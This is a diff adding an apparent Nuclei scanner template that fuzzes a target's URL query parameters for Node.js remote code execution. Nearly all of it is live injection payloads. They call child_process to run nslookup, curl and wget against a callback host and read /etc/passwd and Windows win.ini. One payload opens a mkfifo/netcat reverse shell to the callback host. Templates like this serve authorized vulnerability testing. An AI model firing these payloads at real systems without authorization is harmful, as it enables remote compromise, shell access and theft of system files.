@@ -1,0 +1,58 @@
+id: nodejs-rce-param-fuzzer
+
+info:
+  name: NodeJS RCE via Param Fuzzer
+  author: reewardius
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      injection:
+        - "require('child_process').exec('nslookup {{interactsh-url}}')"
+        - "require('child_process').exec('cat /etc/passwd');{src:/bin/sh/}"
+        - "require('child_process').exec('cat${IFS}/etc/passwd');{src:/bin/sh/}"
+        - ";require('child_process').exec('cat${IFS}/etc/passwd');{src:/bin/sh/}"
+        - "require('child_process').exec('curl http://{{interactsh-url}}')"
+        - "require('child_process').exec('wget http://{{interactsh-url}}')"
+        - "var fs=require('fs');fs.readFileSync('/etc/passwd').toString('utf8')"
+        - "<img src=x onerror=require(`child_process`).execSync(`nslookup {{interactsh-url}}`)"
+        - "var fs=require('fs');fs.readFileSync('C:/Windows/win.ini').toString('utf8')"
+        - "var fs=require('fs');fs.readFileSync('C:\\Windows\\win.ini').toString('utf8')"
+        - "require('child_process').exec('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{interactsh-url}} 443 >/tmp/f')"
+        - "require('child_process').exec('curl '{{interactsh-url}}'')"
+        - "require('child_process').exec('wget '{{interactsh-url}}'')"
+        - "require('child_process').exec('nslookup {{interactsh-url}}')"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
+          - "dns"
+        
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0"
+          
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "[fonts]"
+          - "[extensions]"
+          - "[mci extensions]"
